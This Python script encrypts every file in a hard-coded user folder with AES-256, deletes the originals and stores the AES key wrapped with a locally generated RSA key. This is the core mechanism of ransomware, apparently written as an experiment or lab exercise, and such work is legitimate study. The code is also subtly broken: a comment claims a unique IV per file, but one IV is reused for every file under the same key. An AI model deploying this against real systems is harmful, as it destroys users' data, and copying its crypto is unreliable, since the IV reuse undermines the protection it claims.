import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# AES encryption of files
def encrypt_file_aes(file_path, aes_key, iv):
    with open(file_path, 'rb') as f:
        data = f.read()

    cipher_aes = AES.new(aes_key, AES.MODE_CFB, iv=iv)
    ciphertext = cipher_aes.encrypt(data)

    # Save the encrypted file with the IV prepended
    with open(file_path + ".enc", 'wb') as f:
        f.write(iv)  # Prepend IV to the encrypted data
        f.write(ciphertext)


# RSA encryption of AES key
def encrypt_aes_key_rsa(aes_key, rsa_public_key):
    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)  # Encrypt AES key with RSA public key
    return encrypted_key


# Encrypt all files in the folder
def encrypt_folder(folder_path, rsa_public_key):
    aes_key = get_random_bytes(32)  # AES-256 key
    iv = get_random_bytes(16)
    # Encrypt the AES key with the RSA public key
    encrypted_aes_key = encrypt_aes_key_rsa(aes_key, rsa_public_key)

    # Process each file in the folder
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
              # Unique IV for each file
            encrypt_file_aes(file_path, aes_key, iv)
            os.remove(file_path)  # Optional: Remove original file after encryption

    # Save the encrypted AES key to a file
    with open(os.path.join(folder_path, 'aes_key.bin'), 'wb') as f:
        f.write(encrypted_aes_key)  # Store encrypted AES key


# RSA key generation
def generate_rsa_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()

    with open("private.pem", 'wb') as f:
        f.write(private_key)

    with open("public.pem", 'wb') as f:
        f.write(public_key)

    return load_rsa_keys()


# Load RSA keys from files
def load_rsa_keys():
    with open("private.pem", 'rb') as f:
        private_key = RSA.import_key(f.read())
    
    with open("public.pem", 'rb') as f:
        public_key = RSA.import_key(f.read())
    
    return public_key, private_key


# Main encryption process
if __name__ == "__main__":
    folder_to_encrypt = "C:\\Users\\ts1506\\Desktop\\Security"

    # Generate or load RSA keys
    if not os.path.exists("private.pem") or not os.path.exists("public.pem"):
        public_key, private_key = generate_rsa_keys()
    else:
        public_key, private_key = load_rsa_keys()

    # Encrypt the folder
    encrypt_folder(folder_to_encrypt, public_key)